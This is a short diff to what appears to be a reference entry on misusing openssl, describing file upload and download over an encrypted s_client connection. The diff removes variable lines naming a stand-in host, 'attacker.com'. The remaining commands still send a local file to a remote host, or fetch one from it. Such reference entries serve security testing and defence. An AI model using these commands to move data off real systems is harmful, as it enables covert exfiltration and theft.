@@ -9,9 +9,6 @@ functions:
 
         Send a local file via TCP. Transmission will be encrypted.
       code: |
-        RHOST=attacker.com
-        RPORT=12345
-        LFILE=file_to_send
         openssl s_client -quiet -connect $RHOST:$RPORT < "$LFILE"
   file-download:
     - description: |
@@ -22,8 +19,5 @@ functions:
 
         Fetch a file from a TCP port, transmission will be encrypted.
       code: |
-        RHOST=attacker.com
-        RPORT=12345
-        LFILE=file_to_save
         openssl s_client -quiet -connect $RHOST:$RPORT > "$LFILE"
 ---
